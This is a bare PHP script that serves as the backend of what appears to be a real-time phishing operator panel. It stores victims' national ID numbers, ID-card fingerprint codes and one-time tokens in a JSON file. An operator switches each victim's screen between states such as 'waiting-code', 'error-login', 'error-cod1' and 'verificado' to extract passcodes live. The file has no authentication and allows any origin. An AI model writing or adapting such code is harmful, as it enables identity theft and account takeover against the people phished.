<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

$file = 'sessions.json';

// Load current sessions cache
$sessions = [];
if (file_exists($file)) {
    $raw = file_get_contents($file);
    $data = json_decode($raw, true);
    if (is_array($data)) {
        $sessions = $data;
    }
}

// Process updates on POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    if ($input) {
        $type = $input['type'] ?? '';
        
        if ($type === 'session:created' && isset($input['session'])) {
            // Remove previous session with same ID if any
            $sessions = array_values(array_filter($sessions, function($s) use ($input) {
                return $s['id'] !== $input['session']['id'];
            }));
            $sessions[] = $input['session'];
        } 
        else if ($type === 'session:ping' && isset($input['sessionId'])) {
            foreach ($sessions as &$s) {
                if ($s['id'] === $input['sessionId']) {
                    $s['last_seen'] = round(microtime(true) * 1000);
                }
            }
        } 
        else if ($type === 'session:token' && isset($input['sessionId'])) {
            foreach ($sessions as &$s) {
                if ($s['id'] === $input['sessionId']) {
                    $s['token'] = $input['token'] ?? '';
                    $s['state'] = !empty($s['token']) ? 'waiting-code' : 'typing';
                    $s['last_seen'] = round(microtime(true) * 1000);
                }
            }
        } 
        else if ($type === 'session:device' && isset($input['sessionId'])) {
            foreach ($sessions as &$s) {
                if ($s['id'] === $input['sessionId']) {
                    $s['cedula'] = $input['cedula'] ?? '';
                    $s['codigoDactilar'] = $input['codigoDactilar'] ?? '';
                    $s['state'] = 'typing';
                    $s['last_seen'] = round(microtime(true) * 1000);
                    $s['updatedAt'] = round(microtime(true) * 1000);
                }
            }
        } 
        else if ($type === 'session:action' && isset($input['sessionId'])) {
            foreach ($sessions as &$s) {
                if ($s['id'] === $input['sessionId']) {
                    $action = $input['action'];
                    $newState = 'waiting';
                    if ($action === 'codigo') {
                        $newState = 'waiting-code';
                        $s['token'] = '';
                    }
                    else if ($action === 'error-login') $newState = 'error-login';
                    else if ($action === 'error-cod1') $newState = 'error-cod1';
                    else if ($action === 'error-cod2') $newState = 'error-cod2';
                    else if ($action === 'done') $newState = 'done';
                    else if ($action === 'verificado') $newState = 'verificado';
                    else if ($action === 'reset') $newState = 'idle';
                    else if ($action === 'dispositivo') $newState = 'dispositivo';
                    
                    $s['state'] = $newState;
                    $s['last_seen'] = round(microtime(true) * 1000);
                    $s['updatedAt'] = round(microtime(true) * 1000);
                }
            }
        } 
        else if ($type === 'sessions:clear') {
            $sessions = [];
        }

        // Save updated sessions cache
        $sessions = array_values($sessions);
        file_put_contents($file, json_encode($sessions));
    }
}

// Return current sessions list
echo json_encode($sessions);
